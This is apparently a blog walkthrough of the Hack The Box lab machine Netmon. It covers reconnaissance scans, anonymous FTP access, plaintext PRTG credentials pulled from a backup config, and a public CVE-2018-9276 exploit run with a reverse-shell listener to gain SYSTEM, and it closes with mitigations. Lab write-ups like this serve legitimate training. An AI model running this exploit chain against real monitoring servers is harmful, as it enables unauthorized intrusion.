---
title: Netmon
date: 2025-04-21
categories: [oscp, HTB]
tags: [oscp-preparation, walkthrough, HTB] 
image: netmon.png
media_subpath: /assets/img/posts/2025-04-21-netmonHTB/
---
## Introduction
In this walkthrough we will be solving Hack The Box Easy Windows box Netmon. Let’s start ..
## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

![image.png](image.png)

### UDP

Check first 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

![image.png](image%202.png)

I have noticed MD5 hash, and with purpose not to miss anything I tried to crack but it didn’t yield anything.

## Services

### Port 21

Anonymous login is allowed and we get access to filesystem.

### Port 139/445

```bash
smbclient -L //$IP/ -N
```

![image.png](image%203.png)

Cannot access SMB.

## Web

### Port 80

**PRTG 18.1.37.13946**

Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)

I tried default credentials `prtgadmin : prtgadmin` but it didn’t work.

**Feroxbuster**

```bash
feroxbuster -u [http://$IP/](http://$ip/) -C 404,403,400 -w /usr/share/wordlists/dirb/common.txt
```

![image.png](image%204.png)

I think we should find a newly-set password inside ftp service.

I need something like configuration file so I searched for default configuration file location of PRTG NetMon and found the following `\ProgramData\Paessler\PRTG Network Monitor`

> The `ProgramData` directory in Windows is not visible by default because it is a hidden system folder. It is set to "Hidden" in its file attributes to prevent accidental modification by users, as it stores critical application data and settings shared across users.
{: .prompt-info }


![image.png](image%205.png)

There is nothing in `PRTG Configuration.dat` and `PRTG Configuration.old` I have found some base64 encoded strings but they decode to non-ascii characters.

I opened files with sublime text and searched for string `pass` and found nothing, but when I opened `"PRTG Configurat.old.bak"` just the first match showed me the password for prtgadmin user:

## Credentials

```bash
prtgadmin:PrTg@dmin2018
```

## Exploitation

I used these credentials for logging in but they seemed to not work, then I realized that this is old backup file, I saw that current config file is of date 2019, so I changed the year to 2019.

I found a vulnerability for this version of PRTG NetMon, but it was a bit weird code [ExploitDB](https://www.exploit-db.com/exploits/46527) , then I searched that exploit python code in hosted in github and found this code:

[https://github.com/A1vinSmith/CVE-2018-9276/blob/main/README.md](https://github.com/A1vinSmith/CVE-2018-9276/blob/main/README.md)

I executed it:

![image.png](image%206.png)

```bash
python3 [exploit.py](http://exploit.py/) -i $IP -p 80 --lhost 10.10.14.6 --lport 80 --user prtgadmin --password PrTg@dmin2019
```

![image.png](image%207.png)

Now we are nt authrority\system!.

## Mitigation

- **Restrict FTP Access**
    
    Disable anonymous FTP access or restrict it to specific directories with non-sensitive content. Use authentication and enforce least privilege access controls.
    
- **Secure Configuration Files**
    
    Avoid storing plaintext credentials or sensitive information in configuration files accessible to low-privilege users or services. Store them with proper permissions and encryption where possible.
    
- **Patch Vulnerable Software**
    
    Keep PRTG Network Monitor and all third-party software updated to the latest versions to address known vulnerabilities, especially those enabling RCE.
    
- **Limit Privileges of Monitoring Services**
    
    Run PRTG and similar services with minimal required privileges instead of SYSTEM-level to reduce the impact of a potential compromise.
    
- **Monitor Network and File Access**
    
    Implement logging and monitoring for suspicious file access patterns and unauthorized configuration file reads, especially from publicly accessible services like FTP.
    
- **Network Segmentation**
    
    Isolate monitoring systems like PRTG from public-facing services and use firewall rules to restrict access only to trusted hosts.
